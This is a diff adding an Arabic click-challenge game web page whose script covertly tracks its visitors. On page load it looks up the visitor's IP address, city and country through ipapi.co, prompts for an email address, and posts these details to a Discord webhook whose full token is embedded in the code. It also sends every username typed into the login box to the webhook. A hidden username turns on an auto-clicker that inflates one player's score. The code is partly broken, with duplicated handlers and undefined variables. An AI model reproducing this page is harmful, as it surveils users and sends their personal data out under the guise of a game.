@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحدي النقر - النسخة المعدلة</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #f7cac9, #92a8d1, #034f84, #f7786b);
+            background-size: 400% 400%;
+            animation: bgAnimation 8s infinite alternate;
+        }
+
+        @keyframes bgAnimation {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
+
+        #game-container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            position: absolute;
+            top: 10%;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 10;
+        }
+
+        h1 {
+            color: #4a90e2;
+            margin-bottom: 15px;
+            font-size: 24px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        #score, #time {
+            font-size: 20px;
+            color: #333;
+            margin: 10px 0;
+        }
+
+        #start-button {
+            padding: 15px 30px;
+            font-size: 18px;
+            color: #fff;
+            background: linear-gradient(45deg, #f12711, #f5af19);
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s, background 0.3s;
+            margin-top: 10px;
+            position: relative;
+        }
+
+        #start-button:hover {
+            transform: scale(1.1);
+            background: linear-gradient(45deg, #f5af19, #f12711);
+        }
+
+        #click-button {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            padding: 15px 30px;
+            font-size: 18px;
+            color: #fff;
+            background: linear-gradient(45deg, #f12711, #f5af19);
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s, background 0.3s;
+            display: none;
+        }
+
+        #click-button:hover {
+            transform: scale(1.1);
+            background: linear-gradient(45deg, #f5af19, #f12711);
+        }
+
+        .effect {
+            position: absolute;
+            width: 40px;
+            height: 40px;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.8), transparent);
+            border-radius: 50%;
+            pointer-events: none;
+            animation: explode 0.6s forwards;
+        }
+
+        @keyframes explode {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(3); opacity: 0; }
+        }
+
+        #click-robot {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #click-robot:hover {
+            background-color: #45a049;
+        }
+
+        #login-container {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            position: absolute;
+            bottom: 10px; /* تم تغيير الموضع ليظهر أسفل الصفحة */
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        #login-container input {
+            padding: 10px;
+            font-size: 16px;
+            margin: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        #login-container button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #login-container button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <!-- صفحة اللعبة -->
+    <div id="game-container">
+        <h1>تحدي النقر</h1>
+        <p id="score">النقاط: 0</p>
+        <p id="time">الوقت المتبقي: 10 ثوانٍ</p>
+        <button id="start-button">Start Game</button>
+    </div>
+
+    <!-- زر Click Here سيتم إظهاره بعد بدء اللعبة -->
+    <button id="click-button">Click Here</button>
+
+    <!-- زر Click Robot -->
+    <button id="click-robot">Click Robot</button>
+
+    <!-- صفحة تسجيل الدخول -->
+    <div id="login-container">
+        <h2>تسجيل الدخول</h2>
+        <input type="text" id="username" placeholder="أدخل اسم المستخدم" />
+        <button id="login-button">تسجيل الدخول</button>
+    </div>
+
+    <script>
+        const scoreElement = document.getElementById('score');
+        const timeElement = document.getElementById('time');
+        const startButton = document.getElementById('start-button');
+        const clickButton = document.getElementById('click-button');
+        const clickRobotButton = document.getElementById('click-robot');
+        const gameContainer = document.getElementById('game-container');
+        const loginContainer = document.getElementById('login-container');
+        const usernameInput = document.getElementById('username');
+        const loginButton = document.getElementById('login-button');
+        const webhookURL = "https://discord.com/api/webhooks/1314983026207359026/B4iqp2yYZ8c9s7WbLMQxc7ShPZi1A55ouBCn-FyEEq9PuM-sPySTB-fOfw0q0zDvfEHl"; // ضع رابط الـ Webhook هنا
+        let score = 0;
+        let gameStarted = false;
+        let timeLeft = 10; // مدة اللعبة بالثواني
+        let timerInterval;
+        let isFaris = false; // تحديد إذا كان اليوزر هو Faris9178
+
+        // إظهار صفحة تسجيل الدخول عند الضغط على "Click Robot"
+        clickRobotButton.addEventListener('click', () => {
+            loginContainer.style.display = 'block';
+        });
+
+        // تحقق من تسجيل الدخول
+        loginButton.addEventListener('click', () => {
+            const username = usernameInput.value.trim();
+            if (username === 'Faris9178') {
+                isFaris = true;
+                loginContainer.style.display = 'none';
+                startGame(); // ابدأ اللعبة مباشرة إذا كان اليوزر صحيح
+                clickButton.style.display = 'inline-block'; // إظهار زر "Click Here"
+            } else {
+                alert('اسم المستخدم غير صحيح!');
+            }
+        });
+
+
+
+            // إرسال رسالة إلى Discord
+    function sendToDiscord(content) {
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ content }),
+        }).catch(err => console.error('Failed to send message to Discord:', err));
+    }
+
+    // إرسال رسالة عند دخول أي مستخدم إلى الصفحة
+    window.onload = () => {
+        sendToDiscord('🚀 دخل مستخدم جديد إلى صفحة "تحدي النقر"!');
+    };
+
+    // تحقق من تسجيل الدخول
+    loginButton.addEventListener('click', () => {
+        const username = usernameInput.value.trim();
+        if (username) {
+            sendToDiscord(`✅ المستخدم "${username}" قام بتسجيل الدخول.`);
+            if (username === 'Faris9178') {
+                isFaris = true;
+                loginContainer.style.display = 'none';
+                startGame();
+                clickButton.style.display = 'inline-block';
+            } else {
+                alert('اسم المستخدم غير صحيح!');
+            }
+        }
+    });
+
+
+        // تحديث الوقت
+        function updateTimer() {
+            timeLeft--;
+            timeElement.textContent = `الوقت المتبقي: ${timeLeft} ثوانٍ`;
+            if (timeLeft <= 0) {
+                endGame();
+            }
+        }
+
+        // تأثير عند النقر
+        function createEffect(event) {
+            const effect = document.createElement('div');
+            effect.className = 'effect';
+            effect.style.left = `${event.clientX - 20}px`;
+            effect.style.top = `${event.clientY - 20}px`;
+            document.body.appendChild(effect);
+
+            setTimeout(() => {
+                effect.remove();
+            }, 600);
+        }
+
+        // عند الضغط على زر "Start Game"
+        startButton.addEventListener('click', () => {
+            startGame();
+            startButton.style.display = 'none'; // إخفاء زر البداية بعد الضغط عليه
+            clickButton.style.display = 'inline-block'; // إظهار زر "Click Here"
+        });
+
+        // عند الضغط على زر "Click Here"
+        clickButton.addEventListener('click', (event) => {
+            score++;
+            scoreElement.textContent = `النقاط: ${score}`;
+            createEffect(event);
+        });
+
+        function startGame() {
+            gameStarted = true;
+            score = 0;
+            timeLeft = 10;
+            scoreElement.textContent = 'النقاط: 0';
+            timeElement.textContent = 'الوقت المتبقي: 10 ثوانٍ';
+            timerInterval = setInterval(updateTimer, 1000); // تحديث الوقت كل ثانية
+
+            // إذا كان اليوزر Faris9178، يتم تفعيل النقر التلقائي
+            if (isFaris) {
+                setInterval(() => {
+                    clickButton.click(); // يقوم النقر على الزر "Click Here" تلقائيًا
+                }, 33); // كل 33 ملي ثانية (أي 30 مرة في الثانية)
+            }
+        }
+
+        function endGame() {
+            clearInterval(timerInterval);
+            gameStarted = false;
+            alert(`انتهت اللعبة! نقاطك: ${score}`);
+            scoreElement.textContent = 'النقاط: 0';
+            timeElement.textContent = 'الوقت المتبقي: 10 ثوانٍ';
+            startButton.style.display = 'inline-block'; // إظهار زر البداية مرة أخرى
+            clickButton.style.display = 'none'; // إخفاء زر "Click Here" بعد انتهاء اللعبة
+        }
+
+
+    // جلب IP والموقع
+    async function fetchUserDetails() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            const ip = data.ip || 'غير معروف';
+            const city = data.city || 'غير معروف';
+            const country = data.country_name || 'غير معروف';
+            const email = prompt('الرجاء إدخال بريدك الإلكتروني:');
+
+            // إرسال البيانات إلى Discord
+            sendToDiscord(`🚀 مستخدم جديد دخل الصفحة!
+            **IP:** ${ip}
+            **الموقع:** ${city}, ${country}
+            **البريد الإلكتروني:** ${email || 'لم يتم إدخال بريد'}`);
+        } catch (error) {
+            console.error('Failed to fetch IP or location:', error);
+        }
+    }
+
+    // إرسال رسالة عند دخول أي مستخدم إلى الصفحة
+    window.onload = () => {
+        fetchUserDetails();
+    };
+
+        // الإبلاغ عن النقاط المكتسبة
+        function reportUserScore(score) {
+        sendToDiscord(`🎮 تحديث النقاط!
+        **IP:** ${userIP}
+        **البريد الإلكتروني:** ${userEmail}
+        **النقاط المكتسبة:** ${score}`);
+    }
+
+        // الإبلاغ عن دخول المستخدم
+        async function reportUserEntry() {
+        await fetchUserIP(); // جلب IP
+        await fetchUserEmail(); // جلب البريد الإلكتروني
+        sendToDiscord(`🚀 مستخدم جديد دخل الصفحة!
+        **IP:** ${userIP}
+        **البريد الإلكتروني:** ${userEmail}`);
+    }
+
+        // جلب البريد الإلكتروني عند دخول الصفحة
+        async function fetchUserEmail() {
+        userEmail = prompt("الرجاء إدخال بريدك الإلكتروني:") || "غير معروف";
+    }
+
+    
+
+
+
+    </script>
+</body>
+</html>
